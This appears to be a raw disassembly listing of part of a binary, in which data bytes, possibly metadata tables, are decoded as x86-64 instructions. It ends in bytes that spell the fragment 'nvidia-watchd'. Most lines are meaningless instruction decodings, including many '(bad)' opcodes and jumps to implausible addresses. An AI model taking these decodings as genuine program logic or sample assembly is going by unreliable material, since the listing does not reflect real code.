  407e26:	24 0a                	and    $0xa,%al
  407e28:	00 00                	add    %al,(%rax)
  407e2a:	01 00                	add    %eax,(%rax)
  407e2c:	24 0a                	and    $0xa,%al
  407e2e:	00 00                	add    %al,(%rax)
  407e30:	02 00                	add    (%rax),%al
  407e32:	24 0a                	and    $0xa,%al
  407e34:	00 00                	add    %al,(%rax)
  407e36:	03 00                	add    (%rax),%eax
  407e38:	24 0a                	and    $0xa,%al
  407e3a:	00 00                	add    %al,(%rax)
  407e3c:	04 00                	add    $0x0,%al
  407e3e:	24 0a                	and    $0xa,%al
  407e40:	00 00                	add    %al,(%rax)
  407e42:	05 00 24 0a 00       	add    $0xa2400,%eax
  407e47:	00 06                	add    %al,(%rsi)
  407e49:	00 24 0a             	add    %ah,(%rdx,%rcx,1)
  407e4c:	00 00                	add    %al,(%rax)
  407e4e:	07                   	(bad)
  407e4f:	00 24 0a             	add    %ah,(%rdx,%rcx,1)
  407e52:	00 00                	add    %al,(%rax)
  407e54:	08 00                	or     %al,(%rax)
  407e56:	24 0a                	and    $0xa,%al
  407e58:	00 00                	add    %al,(%rax)
  407e5a:	01 00                	add    %eax,(%rax)
  407e5c:	24 0a                	and    $0xa,%al
  407e5e:	00 00                	add    %al,(%rax)
  407e60:	02 00                	add    (%rax),%al
  407e62:	24 0a                	and    $0xa,%al
  407e64:	00 00                	add    %al,(%rax)
  407e66:	03 00                	add    (%rax),%eax
  407e68:	24 0a                	and    $0xa,%al
  407e6a:	00 00                	add    %al,(%rax)
  407e6c:	04 00                	add    $0x0,%al
  407e6e:	24 0a                	and    $0xa,%al
  407e70:	00 00                	add    %al,(%rax)
  407e72:	05 00 24 0a 00       	add    $0xa2400,%eax
  407e77:	00 06                	add    %al,(%rsi)
  407e79:	00 24 0a             	add    %ah,(%rdx,%rcx,1)
  407e7c:	00 00                	add    %al,(%rax)
  407e7e:	07                   	(bad)
  407e7f:	00 24 0a             	add    %ah,(%rdx,%rcx,1)
  407e82:	00 00                	add    %al,(%rax)
  407e84:	08 00                	or     %al,(%rax)
  407e86:	24 0a                	and    $0xa,%al
  407e88:	00 00                	add    %al,(%rax)
  407e8a:	01 00                	add    %eax,(%rax)
  407e8c:	24 0a                	and    $0xa,%al
  407e8e:	00 00                	add    %al,(%rax)
  407e90:	02 00                	add    (%rax),%al
  407e92:	24 0a                	and    $0xa,%al
  407e94:	00 00                	add    %al,(%rax)
  407e96:	03 00                	add    (%rax),%eax
  407e98:	24 0a                	and    $0xa,%al
  407e9a:	00 00                	add    %al,(%rax)
  407e9c:	04 00                	add    $0x0,%al
  407e9e:	24 0a                	and    $0xa,%al
  407ea0:	00 00                	add    %al,(%rax)
  407ea2:	05 00 24 0a 00       	add    $0xa2400,%eax
  407ea7:	00 06                	add    %al,(%rsi)
  407ea9:	00 24 0a             	add    %ah,(%rdx,%rcx,1)
  407eac:	00 00                	add    %al,(%rax)
  407eae:	07                   	(bad)
  407eaf:	00 24 0a             	add    %ah,(%rdx,%rcx,1)
  407eb2:	00 00                	add    %al,(%rax)
  407eb4:	08 00                	or     %al,(%rax)
  407eb6:	24 0a                	and    $0xa,%al
  407eb8:	00 00                	add    %al,(%rax)
  407eba:	01 00                	add    %eax,(%rax)
  407ebc:	24 0a                	and    $0xa,%al
  407ebe:	00 00                	add    %al,(%rax)
  407ec0:	02 00                	add    (%rax),%al
  407ec2:	24 0a                	and    $0xa,%al
  407ec4:	00 00                	add    %al,(%rax)
  407ec6:	01 00                	add    %eax,(%rax)
  407ec8:	24 0a                	and    $0xa,%al
  407eca:	00 00                	add    %al,(%rax)
  407ecc:	01 00                	add    %eax,(%rax)
  407ece:	24 0a                	and    $0xa,%al
  407ed0:	00 00                	add    %al,(%rax)
  407ed2:	01 00                	add    %eax,(%rax)
  407ed4:	24 0a                	and    $0xa,%al
  407ed6:	00 00                	add    %al,(%rax)
  407ed8:	01 00                	add    %eax,(%rax)
  407eda:	24 0a                	and    $0xa,%al
  407edc:	00 00                	add    %al,(%rax)
  407ede:	01 00                	add    %eax,(%rax)
  407ee0:	24 0a                	and    $0xa,%al
  407ee2:	00 00                	add    %al,(%rax)
  407ee4:	02 00                	add    (%rax),%al
  407ee6:	24 0a                	and    $0xa,%al
  407ee8:	00 00                	add    %al,(%rax)
  407eea:	01 00                	add    %eax,(%rax)
  407eec:	24 0a                	and    $0xa,%al
  407eee:	00 00                	add    %al,(%rax)
  407ef0:	01 00                	add    %eax,(%rax)
  407ef2:	24 0a                	and    $0xa,%al
  407ef4:	00 00                	add    %al,(%rax)
  407ef6:	01 00                	add    %eax,(%rax)
  407ef8:	24 0a                	and    $0xa,%al
  407efa:	00 00                	add    %al,(%rax)
  407efc:	01 00                	add    %eax,(%rax)
  407efe:	24 0a                	and    $0xa,%al
  407f00:	00 00                	add    %al,(%rax)
  407f02:	01 00                	add    %eax,(%rax)
  407f04:	24 0a                	and    $0xa,%al
  407f06:	00 00                	add    %al,(%rax)
  407f08:	02 00                	add    (%rax),%al
  407f0a:	24 0a                	and    $0xa,%al
  407f0c:	00 00                	add    %al,(%rax)
  407f0e:	01 00                	add    %eax,(%rax)
  407f10:	24 0a                	and    $0xa,%al
  407f12:	00 00                	add    %al,(%rax)
  407f14:	02 00                	add    (%rax),%al
  407f16:	24 0a                	and    $0xa,%al
  407f18:	00 00                	add    %al,(%rax)
  407f1a:	01 00                	add    %eax,(%rax)
  407f1c:	73 11                	jae    0x407f2f
  407f1e:	00 00                	add    %al,(%rax)
  407f20:	02 00                	add    (%rax),%al
  407f22:	7d 11                	jge    0x407f35
  407f24:	00 00                	add    %al,(%rax)
  407f26:	03 00                	add    (%rax),%eax
  407f28:	82                   	(bad)
  407f29:	11 00                	adc    %eax,(%rax)
  407f2b:	20 04 00             	and    %al,(%rax,%rax,1)
  407f2e:	87 11                	xchg   %edx,(%rcx)
  407f30:	00 00                	add    %al,(%rax)
  407f32:	05 00 8d 11 00       	add    $0x118d00,%eax
  407f37:	00 06                	add    %al,(%rsi)
  407f39:	00 99 11 00 00 01    	add    %bl,0x1000011(%rcx)
  407f3f:	00 73 11             	add    %dh,0x11(%rbx)
  407f42:	00 00                	add    %al,(%rax)
  407f44:	02 00                	add    (%rax),%al
  407f46:	7d 11                	jge    0x407f59
  407f48:	00 00                	add    %al,(%rax)
  407f4a:	03 00                	add    (%rax),%eax
  407f4c:	82                   	(bad)
  407f4d:	11 00                	adc    %eax,(%rax)
  407f4f:	20 04 00             	and    %al,(%rax,%rax,1)
  407f52:	87 11                	xchg   %edx,(%rcx)
  407f54:	00 00                	add    %al,(%rax)
  407f56:	05 00 8d 11 00       	add    $0x118d00,%eax
  407f5b:	00 06                	add    %al,(%rsi)
  407f5d:	00 99 11 00 00 07    	add    %bl,0x7000011(%rcx)
  407f63:	00 5d 0a             	add    %bl,0xa(%rbp)
  407f66:	00 00                	add    %al,(%rax)
  407f68:	08 00                	or     %al,(%rax)
  407f6a:	66 0a 00             	data16 or (%rax),%al
  407f6d:	00 01                	add    %al,(%rcx)
  407f6f:	00 99 11 00 00 02    	add    %bl,0x2000011(%rcx)
  407f75:	00 77 0a             	add    %dh,0xa(%rdi)
  407f78:	00 00                	add    %al,(%rax)
  407f7a:	01 00                	add    %eax,(%rax)
  407f7c:	24 0a                	and    $0xa,%al
  407f7e:	00 00                	add    %al,(%rax)
  407f80:	02 00                	add    (%rax),%al
  407f82:	24 0a                	and    $0xa,%al
  407f84:	00 00                	add    %al,(%rax)
  407f86:	01 00                	add    %eax,(%rax)
  407f88:	5d                   	pop    %rbp
  407f89:	0a 00                	or     (%rax),%al
  407f8b:	00 02                	add    %al,(%rdx)
  407f8d:	00 66 0a             	add    %ah,0xa(%rsi)
  407f90:	00 00                	add    %al,(%rax)
  407f92:	01 00                	add    %eax,(%rax)
  407f94:	77 0a                	ja     0x407fa0
  407f96:	09 00                	or     %eax,(%rax)
  407f98:	43 00 29             	rex.XB add %bpl,(%r9)
  407f9b:	00 21                	add    %ah,(%rcx)
  407f9d:	00 43 00             	add    %al,0x0(%rbx)
  407fa0:	29 00                	sub    %eax,(%rax)
  407fa2:	29 00                	sub    %eax,(%rax)
  407fa4:	43 00 29             	rex.XB add %bpl,(%r9)
  407fa7:	00 31                	add    %dh,(%rcx)
  407fa9:	00 43 00             	add    %al,0x0(%rbx)
  407fac:	29 00                	sub    %eax,(%rax)
  407fae:	39 00                	cmp    %eax,(%rax)
  407fb0:	43 00 29             	rex.XB add %bpl,(%r9)
  407fb3:	00 41 00             	add    %al,0x0(%rcx)
  407fb6:	43 00 ab 00 59 00 43 	rex.XB add %bpl,0x43005900(%r11)
  407fbd:	00 cf                	add    %cl,%bh
  407fbf:	00 91 00 76 04 e1    	add    %dl,-0x1efb8a00(%rcx)
  407fc5:	00 99 00 8f 04 e7    	add    %bl,-0x18fb7100(%rcx)
  407fcb:	00 a9 00 43 00 cf    	add    %ch,-0x30ffbd00(%rcx)
  407fd1:	00 a9 00 4d 05 21    	add    %ch,0x21054d00(%rcx)
  407fd7:	01 b1 00 43 00 27    	add    %esi,0x27004300(%rcx)
  407fdd:	01 b1 00 72 05 cf    	add    %esi,-0x30fa8e00(%rcx)
  407fe3:	00 e1                	add    %ah,%cl
  407fe5:	00 43 00             	add    %al,0x0(%rbx)
  407fe8:	29 00                	sub    %eax,(%rax)
  407fea:	e9 00 43 00 2e       	jmp    0x2e40c2ef
  407fef:	01 e9                	add    %ebp,%ecx
  407ff1:	00 9f 05 36 01 b9    	add    %bl,-0x46fec9fb(%rdi)
  407ff7:	00 a3 05 3b 01 d1    	add    %ah,-0x2efec4fb(%rbx)
  407ffd:	00 b1 05 40 01 f1    	add    %dh,-0xefebffb(%rcx)
  408003:	00 d2                	add    %dl,%dl
  408005:	05 45 01 19 00       	add    $0x190145,%eax
  40800a:	db 05 4a 01 d1 00    	fildl  0xd1014a(%rip)        # 0x111815a
  408010:	e2 05                	loop   0x408017
  408012:	50                   	push   %rax
  408013:	01 f9                	add    %edi,%ecx
  408015:	00 f7                	add    %dh,%bh
  408017:	05 cf 00 19 00       	add    $0x1900cf,%eax
  40801c:	ff 05 54 01 61 00    	incl   0x610154(%rip)        # 0xa18176
  408022:	18 06                	sbb    %al,(%rsi)
  408024:	5c                   	pop    %rsp
  408025:	01 19                	add    %ebx,(%rcx)
  408027:	00 21                	add    %ah,(%rcx)
  408029:	06                   	(bad)
  40802a:	60                   	(bad)
  40802b:	01 19                	add    %ebx,(%rcx)
  40802d:	00 db                	add    %bl,%bl
  40802f:	05 65 01 19 00       	add    $0x190165,%eax
  408034:	2a 06                	sub    (%rsi),%al
  408036:	6e                   	outsb  (%rsi),(%dx)
  408037:	01 91 00 36 06 74    	add    %edx,0x74063600(%rcx)
  40803d:	01 91 00 3d 06 79    	add    %edx,0x79063d00(%rcx)
  408043:	01 c9                	add    %ecx,%ecx
  408045:	00 43 00             	add    %al,0x0(%rbx)
  408048:	cf                   	iret
  408049:	00 c9                	add    %cl,%cl
  40804b:	00 4b 06             	add    %cl,0x6(%rbx)
  40804e:	29 00                	sub    %eax,(%rax)
  408050:	c9                   	leave
  408051:	00 58 06             	add    %bl,0x6(%rax)
  408054:	80 01 11             	addb   $0x11,(%rcx)
  408057:	01 80 06 87 01 c9    	add    %eax,-0x36fe78fa(%rax)
  40805d:	00 91 06 29 00 c9    	add    %dl,-0x36ffd6fa(%rcx)
  408063:	00 a6 06 8c 01 19    	add    %ah,0x19018c06(%rsi)
  408069:	01 c1                	add    %eax,%ecx
  40806b:	06                   	(bad)
  40806c:	91                   	xchg   %eax,%ecx
  40806d:	01 21                	add    %esp,(%rcx)
  40806f:	01 df                	add    %ebx,%edi
  408071:	06                   	(bad)
  408072:	e7 00                	out    %eax,$0x0
  408074:	29 01                	sub    %eax,(%rcx)
  408076:	1d 07 99 01 31       	sbb    $0x31019907,%eax
  40807b:	01 2f                	add    %ebp,(%rdi)
  40807d:	07                   	(bad)
  40807e:	e1 00                	loope  0x408080
  408080:	29 01                	sub    %eax,(%rcx)
  408082:	40 07                	rex (bad)
  408084:	9f                   	lahf
  408085:	01 29                	add    %ebp,(%rcx)
  408087:	01 ef                	add    %ebp,%edi
  408089:	07                   	(bad)
  40808a:	c8 01 39 01          	enter  $0x3901,$0x1
  40808e:	43 00 ce             	rex.XB add %cl,%r14b
  408091:	01 41 01             	add    %eax,0x1(%rcx)
  408094:	43 00 cf             	rex.XB add %cl,%r15b
  408097:	00 61 01             	add    %ah,0x1(%rcx)
  40809a:	0b 08                	or     (%rax),%ecx
  40809c:	ab                   	stos   %eax,(%rdi)
  40809d:	00 61 01             	add    %ah,0x1(%rcx)
  4080a0:	17                   	(bad)
  4080a1:	08 d6                	or     %dl,%dh
  4080a3:	01 71 01             	add    %esi,0x1(%rcx)
  4080a6:	ef                   	out    %eax,(%dx)
  4080a7:	07                   	(bad)
  4080a8:	dd 01                	fldl   (%rcx)
  4080aa:	61                   	(bad)
  4080ab:	01 37                	add    %esi,(%rdi)
  4080ad:	08 e3                	or     %ah,%bl
  4080af:	01 61 01             	add    %esp,0x1(%rcx)
  4080b2:	47 08 e3             	rex.RXB or %r12b,%r11b
  4080b5:	01 51 01             	add    %edx,0x1(%rcx)
  4080b8:	43 00 cf             	rex.XB add %cl,%r15b
  4080bb:	00 59 01             	add    %bl,0x1(%rcx)
  4080be:	43 00 ed             	rex.XB add %bpl,%r13b
  4080c1:	01 79 01             	add    %edi,0x1(%rcx)
  4080c4:	6f                   	outsl  (%rsi),(%dx)
  4080c5:	08 fa                	or     %bh,%dl
  4080c7:	01 79 01             	add    %edi,0x1(%rcx)
  4080ca:	75 08                	jne    0x4080d4
  4080cc:	cf                   	iret
  4080cd:	00 51 01             	add    %dl,0x1(%rcx)
  4080d0:	7b 08                	jnp    0x4080da
  4080d2:	02 02                	add    (%rdx),%al
  4080d4:	c9                   	leave
  4080d5:	00 a1 08 29 00 99    	add    %ah,-0x66ffd6f8(%rcx)
  4080db:	00 af 08 12 02 c9    	add    %ch,-0x36fdedf8(%rdi)
  4080e1:	00 c3                	add    %al,%bl
  4080e3:	08 8c 01 c9 00 d7 08 	or     %cl,0x8d700c9(%rcx,%rax,1)
  4080ea:	8c 01                	mov    %es,(%rcx)
  4080ec:	19 01                	sbb    %eax,(%rcx)
  4080ee:	f2 08 cf             	repnz or %cl,%bh
  4080f1:	00 61 00             	add    %ah,0x0(%rcx)
  4080f4:	43 00 cf             	rex.XB add %cl,%r15b
  4080f7:	00 99 00 05 09 16    	add    %bl,0x16090500(%rcx)
  4080fd:	02 11                	add    (%rcx),%dl
  4080ff:	01 21                	add    %esp,(%rcx)
  408101:	09 65 01             	or     %esp,0x1(%rbp)
  408104:	91                   	xchg   %eax,%ecx
  408105:	01 6a 09             	add    %ebp,0x9(%rdx)
  408108:	33 02                	xor    (%rdx),%eax
  40810a:	99                   	cltd
  40810b:	01 76 09             	add    %esi,0x9(%rsi)
  40810e:	3a 02                	cmp    (%rdx),%al
  408110:	b1 01                	mov    $0x1,%cl
  408112:	8b 09                	mov    (%rcx),%ecx
  408114:	41 02 91 01 9d 09 45 	add    0x45099d01(%r9),%dl
  40811b:	02 c1                	add    %cl,%al
  40811d:	01 bf 09 4c 02 a1    	add    %edi,-0x5efdb3f7(%rdi)
  408123:	01 ce                	add    %ecx,%esi
  408125:	09 58 02             	or     %ebx,0x2(%rax)
  408128:	99                   	cltd
  408129:	01 d7                	add    %edx,%edi
  40812b:	09 5e 02             	or     %ebx,0x2(%rsi)
  40812e:	99                   	cltd
  40812f:	01 fb                	add    %edi,%ebx
  408131:	09 67 02             	or     %esp,0x2(%rdi)
  408134:	d1 01                	roll   $1,(%rcx)
  408136:	11 0a                	adc    %ecx,(%rdx)
  408138:	6d                   	insl   (%dx),(%rdi)
  408139:	02 11                	add    (%rcx),%dl
  40813b:	02 da                	add    %dl,%bl
  40813d:	0b b7 02 d9 01 03    	or     0x301d902(%rdi),%esi
  408143:	0c 93                	or     $0x93,%al
  408145:	02 f1                	add    %cl,%dh
  408147:	01 43 00             	add    %eax,0x0(%rbx)
  40814a:	cf                   	iret
  40814b:	00 f9                	add    %bh,%cl
  40814d:	01 43 00             	add    %eax,0x0(%rbx)
  408150:	cf                   	iret
  408151:	00 29                	add    %ch,(%rcx)
  408153:	02 21                	add    (%rcx),%ah
  408155:	0c c1                	or     $0xc1,%al
  408157:	02 39                	add    (%rcx),%bh
  408159:	02 ef                	add    %bh,%ch
  40815b:	07                   	(bad)
  40815c:	e8 02 19 02 64       	call   0x64429a63
  408161:	0c ee                	or     $0xee,%al
  408163:	02 49 02             	add    0x2(%rcx),%cl
  408166:	43 00 cf             	rex.XB add %cl,%r15b
  408169:	00 51 02             	add    %dl,0x2(%rcx)
  40816c:	e5 0c                	in     $0xc,%eax
  40816e:	1f                   	(bad)
  40816f:	03 59 02             	add    0x2(%rcx),%ebx
  408172:	19 0d 27 03 61 02    	sbb    %ecx,0x2610327(%rip)        # 0x2a1849f
  408178:	37                   	(bad)
  408179:	0d 0f 03 69 02       	or     $0x269030f,%eax
  40817e:	43 00 cf             	rex.XB add %cl,%r15b
  408181:	00 71 02             	add    %dh,0x2(%rcx)
  408184:	84 0d 2b 03 19 00    	test   %cl,0x19032b(%rip)        # 0x5984b5
  40818a:	9a                   	(bad)
  40818b:	0d 41 02 79 02       	or     $0x2790241,%eax
  408190:	43 00 88 03 19 00 c6 	rex.XB add %cl,-0x39ffe6fd(%r8)
  408197:	0d 5c 01 29 01       	or     $0x129015c,%eax
  40819c:	cb                   	lret
  40819d:	0d 99 01 29 01       	or     $0x1290199,%eax
  4081a2:	40 07                	rex (bad)
  4081a4:	94                   	xchg   %eax,%esp
  4081a5:	03 99 01 1c 0e b3    	add    -0x4cf1e3ff(%rcx),%ebx
  4081ab:	03 b9 01 2d 0a be    	add    -0x41f5d2ff(%rcx),%edi
  4081b1:	03 d1                	add    %ecx,%edx
  4081b3:	01 30                	add    %esi,(%rax)
  4081b5:	0e                   	(bad)
  4081b6:	5c                   	pop    %rsp
  4081b7:	01 d1                	add    %edx,%ecx
  4081b9:	01 3d 0e ce 03 89    	add    %edi,-0x76fc31f2(%rip)        # 0xffffffff89444fcd
  4081bf:	02 52 0e             	add    0xe(%rdx),%dl
  4081c2:	5c                   	pop    %rsp
  4081c3:	01 19                	add    %ebx,(%rcx)
  4081c5:	00 5f 0e             	add    %bl,0xe(%rdi)
  4081c8:	d4                   	(bad)
  4081c9:	03 61 00             	add    0x0(%rcx),%esp
  4081cc:	67 0e                	addr32 (bad)
  4081ce:	da 03                	fiaddl (%rbx)
  4081d0:	99                   	cltd
  4081d1:	01 6f 0e             	add    %ebp,0xe(%rdi)
  4081d4:	e0 03                	loopne 0x4081d9
  4081d6:	91                   	xchg   %eax,%ecx
  4081d7:	02 88 0e be 03 99    	add    -0x66fc41f2(%rax),%cl
  4081dd:	02 43 00             	add    0x0(%rbx),%al
  4081e0:	f3 03 79 01          	repz add 0x1(%rcx),%edi
  4081e4:	9a                   	(bad)
  4081e5:	0d 01 04 79 01       	or     $0x1790401,%eax
  4081ea:	c4                   	(bad)
  4081eb:	0e                   	(bad)
  4081ec:	05 04 61 01 d3       	add    $0xd3016104,%eax
  4081f1:	0e                   	(bad)
  4081f2:	1b 04 61             	sbb    (%rcx,%riz,2),%eax
  4081f5:	01 db                	add    %ebx,%ebx
  4081f7:	0e                   	(bad)
  4081f8:	1b 04 61             	sbb    (%rcx,%riz,2),%eax
  4081fb:	01 37                	add    %esi,(%rdi)
  4081fd:	08 21                	or     %ah,(%rcx)
  4081ff:	04 d1                	add    $0xd1,%al
  408201:	01 59 0f             	add    %ebx,0xf(%rcx)
  408204:	42 04 79             	rex.X add $0x79,%al
  408207:	02 86 0f 49 04 79    	add    0x7904490f(%rsi),%al
  40820d:	01 a8 0f 55 04 79    	add    %ebp,0x7904550f(%rax)
  408213:	02 db                	add    %bl,%bl
  408215:	0f dd 01             	paddusw (%rcx),%mm0
  408218:	79 02                	jns    0x40821c
  40821a:	75 08                	jne    0x408224
  40821c:	cf                   	iret
  40821d:	00 19                	add    %bl,(%rcx)
  40821f:	02 0b                	add    (%rbx),%cl
  408221:	10 6a 04             	adc    %ch,0x4(%rdx)
  408224:	89 02                	mov    %eax,(%rdx)
  408226:	39 10                	cmp    %edx,(%rax)
  408228:	02 02                	add    (%rdx),%al
  40822a:	59                   	pop    %rcx
  40822b:	01 aa 10 cf 00 39    	add    %ebp,0x3900cf10(%rdx)
  408231:	02 f3                	add    %bl,%dh
  408233:	10 92 04 71 00 43    	adc    %dl,0x43007104(%rdx)
  408239:	00 cf                	add    %cl,%bh
  40823b:	00 61 01             	add    %ah,0x1(%rcx)
  40823e:	47 08 21             	rex.RXB or %r12b,(%r9)
  408241:	04 31                	add    $0x31,%al
  408243:	01 64 11 b5          	add    %esp,-0x4b(%rcx,%rdx,1)
  408247:	04 b9                	add    $0xb9,%al
  408249:	02 43 00             	add    0x0(%rbx),%al
  40824c:	f9                   	stc
  40824d:	05 c9 02 43 00       	add    $0x4302c9,%eax
  408252:	cf                   	iret
  408253:	00 d1                	add    %dl,%cl
  408255:	02 43 00             	add    0x0(%rbx),%al
  408258:	cf                   	iret
  408259:	00 02                	add    %al,(%rdx)
  40825b:	00 0d 00 a5 01 2e    	add    %cl,0x2e01a500(%rip)        # 0x2e422761
  408261:	00 2b                	add    %ch,(%rbx)
  408263:	00 8e 00 2e 00 33    	add    %cl,0x33002e00(%rsi)
  408269:	00 a2 00 2e 00 3b    	add    %ah,0x3b002e00(%rdx)
  40826f:	00 b0 00 2e 00 23    	add    %dh,0x23002e00(%rax)
  408275:	00 5a 00             	add    %bl,0x0(%rdx)
  408278:	2e 00 0b             	cs add %cl,(%rbx)
  40827b:	00 01                	add    %al,(%rcx)
  40827d:	00 2e                	add    %ch,(%rsi)
  40827f:	00 13                	add    %dl,(%rbx)
  408281:	00 01                	add    %al,(%rcx)
  408283:	00 2e                	add    %ch,(%rsi)
  408285:	00 1b                	add    %bl,(%rbx)
  408287:	00 2e                	add    %ch,(%rsi)
  408289:	00 63 01             	add    %ah,0x1(%rbx)
  40828c:	a3 03 f0 05 83 01 a3 	movabs %eax,0xf003a3018305f003
  408293:	03 f0 
  408295:	05 c3 01 ab 03       	add    $0x3ab01c3,%eax
  40829a:	00 06                	add    %al,(%rsi)
  40829c:	03 02                	add    (%rdx),%eax
  40829e:	b3 03                	mov    $0x3,%bl
  4082a0:	00 06                	add    %al,(%rsi)
  4082a2:	80 03 22             	addb   $0x22,(%rbx)
  4082a5:	02 13                	add    (%rbx),%dl
  4082a7:	05 a0 03 22 02       	add    $0x22203a0,%eax
  4082ac:	13 05 01 04 22 02    	adc    0x2220401(%rip),%eax        # 0x26286b3
  4082b2:	13 05 40 04 22 02    	adc    0x2220440(%rip),%eax        # 0x26286f8
  4082b8:	13 05 60 04 22 02    	adc    0x2220460(%rip),%eax        # 0x262871e
  4082be:	13 05 80 08 22 02    	adc    0x2220880(%rip),%eax        # 0x2628b44
  4082c4:	13 05 c0 08 22 02    	adc    0x22208c0(%rip),%eax        # 0x2628b8a
  4082ca:	13 05 85 00 bb 04    	adc    0x4bb0085(%rip),%eax        # 0x4fb8355
  4082d0:	91                   	xchg   %eax,%ecx
  4082d1:	00 bb 04 01 00 00    	add    %bh,0x104(%rbx)
  4082d7:	01 00                	add    %eax,(%rax)
  4082d9:	00 11                	add    %dl,(%rcx)
  4082db:	00 01                	add    %al,(%rcx)
  4082dd:	00 28                	add    %ch,(%rax)
  4082df:	00 00                	add    %al,(%rax)
  4082e1:	00 12                	add    %dl,(%rdx)
  4082e3:	00 01                	add    %al,(%rcx)
  4082e5:	00 1e                	add    %bl,(%rsi)
  4082e7:	00 00                	add    %al,(%rax)
  4082e9:	00 13                	add    %dl,(%rbx)
  4082eb:	00 01                	add    %al,(%rcx)
  4082ed:	00 20                	add    %ah,(%rax)
  4082ef:	00 00                	add    %al,(%rax)
  4082f1:	00 14 00             	add    %dl,(%rax,%rax,1)
  4082f4:	01 00                	add    %eax,(%rax)
  4082f6:	10 00                	adc    %al,(%rax)
  4082f8:	00 00                	add    %al,(%rax)
  4082fa:	15 00 01 00 40       	adc    $0x40000100,%eax
  4082ff:	00 00                	add    %al,(%rax)
  408301:	00 16                	add    %dl,(%rsi)
  408303:	00 01                	add    %al,(%rcx)
  408305:	00 12                	add    %dl,(%rdx)
  408307:	00 00                	add    %al,(%rax)
  408309:	00 17                	add    %dl,(%rdi)
  40830b:	00 f5                	add    %dh,%ch
  40830d:	00 af 01 0d 02 22    	add    %ch,0x22020d01(%rdi)
  408313:	02 cd                	add    %ch,%cl
  408315:	02 19                	add    (%rcx),%bl
  408317:	03 3c 03             	add    (%rbx,%rax,1),%edi
  40831a:	8f 03                	pop    (%rbx)
  40831c:	aa                   	stos   %al,(%rdi)
  40831d:	03 ca                	add    %edx,%ecx
  40831f:	03 e7                	add    %edi,%esp
  408321:	03 0d 04 27 04 34    	add    0x34042704(%rip),%ecx        # 0x3444aa2b
  408327:	04 a1                	add    $0xa1,%al
  408329:	04 6b                	add    $0x6b,%al
  40832b:	01 00                	add    %eax,(%rax)
  40832d:	c0 00 00             	rolb   $0x0,(%rax)
  408330:	25 00 00 c1 00       	and    $0xc10000,%eax
  408335:	00 26                	add    %ah,(%rsi)
  408337:	00 28                	add    %ch,(%rax)
  408339:	c1 00 00             	roll   $0x0,(%rax)
  40833c:	27                   	(bad)
  40833d:	00 46 c1             	add    %al,-0x3f(%rsi)
  408340:	00 00                	add    %al,(%rax)
  408342:	28 00                	sub    %al,(%rax)
  408344:	66 c1 00 00          	rolw   $0x0,(%rax)
  408348:	29 00                	sub    %eax,(%rax)
  40834a:	76 c1                	jbe    0x40830d
  40834c:	00 00                	add    %al,(%rax)
  40834e:	2a 00                	sub    (%rax),%al
  408350:	96                   	xchg   %eax,%esi
  408351:	c1 00 00             	roll   $0x0,(%rax)
  408354:	2b 00                	sub    (%rax),%eax
  408356:	d6                   	udb
  408357:	c1 00 00             	roll   $0x0,(%rax)
  40835a:	2c 00                	sub    $0x0,%al
  40835c:	04 80                	add    $0x80,%al
	...
  40836e:	01 00                	add    %eax,(%rax)
  408370:	00 00                	add    %al,(%rax)
  408372:	04 00                	add    $0x0,%al
	...
  40837c:	00 00                	add    %al,(%rax)
  40837e:	20 00                	and    %al,(%rax)
  408380:	3a 00                	cmp    (%rax),%al
  408382:	00 00                	add    %al,(%rax)
  408384:	00 00                	add    %al,(%rax)
  408386:	04 00                	add    $0x0,%al
	...
  408390:	00 00                	add    %al,(%rax)
  408392:	ec                   	in     (%dx),%al
  408393:	00 c0                	add    %al,%al
  408395:	04 00                	add    $0x0,%al
  408397:	00 00                	add    %al,(%rax)
  408399:	00 04 00             	add    %al,(%rax,%rax,1)
	...
  4083a4:	00 00                	add    %al,(%rax)
  4083a6:	20 00                	and    %al,(%rax)
  4083a8:	4e 00 00             	rex.WRX add %r8b,(%rax)
  4083ab:	00 00                	add    %al,(%rax)
  4083ad:	00 04 00             	add    %al,(%rax,%rax,1)
	...
  4083b8:	00 00                	add    %al,(%rax)
  4083ba:	20 00                	and    %al,(%rax)
  4083bc:	cf                   	iret
  4083bd:	0c 00                	or     $0x0,%al
  4083bf:	00 00                	add    %al,(%rax)
  4083c1:	00 00                	add    %al,(%rax)
  4083c3:	00 00                	add    %al,(%rax)
  4083c5:	00 02                	add    %al,(%rdx)
  4083c7:	00 00                	add    %al,(%rax)
  4083c9:	00 80 12 00 00 00    	add    %al,0x12(%rax)
  4083cf:	06                   	(bad)
  4083d0:	00 00                	add    %al,(%rax)
  4083d2:	01 00                	add    %eax,(%rax)
  4083d4:	00 00                	add    %al,(%rax)
  4083d6:	a6                   	cmpsb  (%rdi),(%rsi)
  4083d7:	12 00                	adc    (%rax),%al
  4083d9:	00 b8 06 00 00 01    	add    %bh,0x1000006(%rax)
  4083df:	00 00                	add    %al,(%rax)
  4083e1:	00 c2                	add    %al,%dl
  4083e3:	12 00                	adc    (%rax),%al
  4083e5:	00 06                	add    %al,(%rsi)
  4083e7:	00 05 00 08 00 07    	add    %al,0x7000800(%rip)        # 0x7408bed
  4083ed:	00 09                	add    %cl,(%rcx)
  4083ef:	00 08                	add    %cl,(%rax)
  4083f1:	00 0a                	add    %cl,(%rdx)
  4083f3:	00 07                	add    %al,(%rdi)
  4083f5:	00 0b                	add    %cl,(%rbx)
  4083f7:	00 07                	add    %al,(%rdi)
  4083f9:	00 0c 00             	add    %cl,(%rax,%rax,1)
  4083fc:	07                   	(bad)
  4083fd:	00 0d 00 07 00 0e    	add    %cl,0xe000700(%rip)        # 0xe408b03
  408403:	00 07                	add    %al,(%rdi)
  408405:	00 11                	add    %dl,(%rcx)
  408407:	00 10                	add    %dl,(%rax)
  408409:	00 12                	add    %dl,(%rdx)
  40840b:	00 10                	add    %dl,(%rax)
  40840d:	00 13                	add    %dl,(%rbx)
  40840f:	00 10                	add    %dl,(%rax)
  408411:	00 14 00             	add    %dl,(%rax,%rax,1)
  408414:	10 00                	adc    %al,(%rax)
  408416:	15 00 10 00 16       	adc    $0x16001000,%eax
  40841b:	00 10                	add    %dl,(%rax)
  40841d:	00 17                	add    %dl,(%rdi)
  40841f:	00 10                	add    %dl,(%rax)
  408421:	00 00                	add    %al,(%rax)
  408423:	00 00                	add    %al,(%rax)
  408425:	00 12                	add    %dl,(%rdx)
  408427:	00 47 11             	add    %al,0x11(%rdi)
  40842a:	00 00                	add    %al,(%rax)
  40842c:	00 6e 76             	add    %ch,0x76(%rsi)
  40842f:	69 64 69 61 2d 77 61 	imul   $0x7461772d,0x61(%rcx,%rbp,2),%esp
  408436:	74 
  408437:	63 68 64             	movsxd 0x64(%rax),%ebp
